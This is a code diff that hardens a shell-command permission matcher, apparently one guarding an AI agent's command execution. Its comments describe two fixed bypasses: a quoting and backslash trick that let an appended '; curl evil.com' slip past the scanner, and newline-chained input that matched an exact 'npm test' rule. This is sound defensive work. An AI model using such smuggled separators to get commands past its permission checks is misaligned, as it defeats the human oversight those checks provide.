@@ -142,15 +142,18 @@ function containsShellSeparator(command: string): boolean {
       escaped = false;
       continue;
     }
-    if (char === '\\') {
-      escaped = true;
-      continue;
-    }
-    // Inside single quotes: everything (including `$(`, backticks,
-    // newlines, all separators) is literal text. Wait for the
-    // closing `'`.
+    // Inside single quotes: NOTHING escapes. Backslash is literal.
+    // Pre-fix the `\\` case ran before this check, so `'abc\\'`
+    // never closed the quote in our scanner — and bash's actual
+    // semantics (which DO close the quote) left trailing `; curl
+    // evil.com` looking like it was still inside the single-quoted
+    // span. (Codex P1 round-6 bypass.)
     if (quote === '\'') {
       if (char === '\'') quote = undefined;
+      continue;
+    }
+    if (char === '\\') {
+      escaped = true;
       continue;
     }
     // Open a quoted span when we're not inside one.
@@ -222,11 +225,21 @@ function compilePattern(pattern: string): CompiledMatcher {
       },
     };
   }
-  const exact = pattern.replace(/\s+/g, ' ').trim();
+  // Exact match: normalize space + tab only (NOT newlines/CR — those
+  // are shell separators bash treats as `;`). Pre-fix the `\s+`
+  // collapse turned `npm\ntest` into `npm test`, so an exact rule
+  // `"npm test"` matched multi-line input that bash would split into
+  // two commands (Codex P2 round-6). Also gate on
+  // `containsShellSeparator` so any chained / substituted input is
+  // refused even when the first command happens to collapse to the
+  // exact pattern.
+  const exact = pattern.replace(/[ \t]+/g, ' ').trim();
   return {
     source,
-    test: (command: string): boolean =>
-      command.replace(/\s+/g, ' ').trim() === exact,
+    test: (command: string): boolean => {
+      if (containsShellSeparator(command)) return false;
+      return command.replace(/[ \t]+/g, ' ').trim() === exact;
+    },
   };
 }
 
